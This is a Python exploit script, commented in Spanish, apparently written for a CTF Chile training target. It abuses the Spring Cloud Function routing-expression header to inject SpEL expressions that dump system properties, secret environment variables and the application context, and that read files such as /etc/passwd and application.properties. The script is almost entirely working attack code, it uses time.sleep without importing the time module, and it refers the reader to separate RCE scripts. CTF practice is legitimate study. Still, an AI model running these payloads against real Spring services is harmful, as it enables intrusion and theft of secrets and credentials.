#!/usr/bin/env python3
"""
CTF Chile - Extracción directa con SpEL sin RCE
Utiliza SpEL para acceder al contexto de Spring directamente
"""
import requests
import json
import sys

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("⚡ EXTRACCIÓN DIRECTA CON SpEL")
print("=" * 40)

def spel_extract(expression, desc=""):
    """Ejecuta SpEL que retorna valores directamente en la respuesta"""
    try:
        r = requests.post(
            ROUTER,
            headers={
                "spring.cloud.function.routing-expression": expression,
                "Content-Type": "text/plain",
            },
            data="x",
            timeout=15,
        )

        if desc:
            print(f"\n[{desc}]")
            print(f"Status: {r.status_code}")
            print(f"Response: {r.text[:500]}{'...' if len(r.text) > 500 else ''}")

        return r.text, r.status_code
    except Exception as e:
        if desc:
            print(f"\n[{desc}] ERROR: {e}")
        return None, None

# Lista de expresiones SpEL para extraer información
spel_extractions = [
    # Información del sistema
    ('T(java.lang.System).getProperty("user.dir")', "Directorio de trabajo"),
    ('T(java.lang.System).getProperty("java.version")', "Versión Java"),
    ('T(java.lang.System).getProperty("os.name")', "Sistema operativo"),

    # Variables de entorno
    ('T(java.lang.System).getenv("FLAG")', "Variable FLAG"),
    ('T(java.lang.System).getenv("CTF")', "Variable CTF"),
    ('T(java.lang.System).getenv("SECRET")', "Variable SECRET"),
    ('T(java.lang.System).getenv("SPRING_PROFILES_ACTIVE")', "Perfil Spring activo"),

    # Propiedades del sistema
    ('T(java.lang.System).getProperties().toString()', "Propiedades del sistema"),

    # Contexto de Spring (más avanzado, puede fallar)
    ('@applicationContext', "Contexto de aplicación"),
    ('@environment', "Environment de Spring"),

    # Información de red
    ('T(java.net.InetAddress).getLocalHost().toString()', "Host local"),

    # Archivos específicos (usando clases de Java)
    ('T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/hostname")).get(0)', "Hostname"),
]

print("Ejecutando extracciones SpEL...")

results = []
for expression, desc in spel_extractions:
    response, status = spel_extract(expression, desc)
    if response and status:
        results.append((desc, expression, response, status))
    time.sleep(0.5)

# Búsquedas más específicas si las básicas funcionan
print("\n" + "="*40)
print("BÚSQUEDAS AVANZADAS")
print("="*40)

# Intentar leer archivos específicos
file_paths = [
    "/flag.txt",
    "/app/flag.txt",
    "/root/flag.txt",
    "/etc/passwd",
    "/app/application.properties",
]

for filepath in file_paths:
    expr = f'T(java.nio.file.Files).readString(T(java.nio.file.Paths).get("{filepath}"))'
    response, status = spel_extract(expr, f"Leer {filepath}")
    if response and "flag" in response.lower():
        results.append((f"FLAG EN {filepath}", expr, response, status))

print("\n" + "="*50)
print("📊 RESULTADOS IMPORTANTES")
print("="*50)

flags_found = []

for desc, expr, response, status in results:
    # Buscar patterns de flags
    if any(pattern in response.lower() for pattern in ["ctf{", "flag{", "chile{"]):
        print(f"\n🏆 POSIBLE FLAG EN {desc}:")
        print(f"    Respuesta: {response}")
        flags_found.append(response)

    # Información valiosa
    elif status == 200 and response and len(response) > 10:
        print(f"\n💡 {desc}:")
        print(f"    {response[:200]}{'...' if len(response) > 200 else ''}")

if flags_found:
    print(f"\n🎯 FLAGS ENCONTRADAS: {len(flags_found)}")
    for i, flag in enumerate(flags_found, 1):
        print(f"    {i}. {flag}")
else:
    print("\n❌ No se encontraron flags directas")
    print("💡 Prueba los scripts de RCE para búsqueda más profunda")

print("\n" + "="*50)
print("✅ EXTRACCIÓN SpEL COMPLETADA")
print("="*50)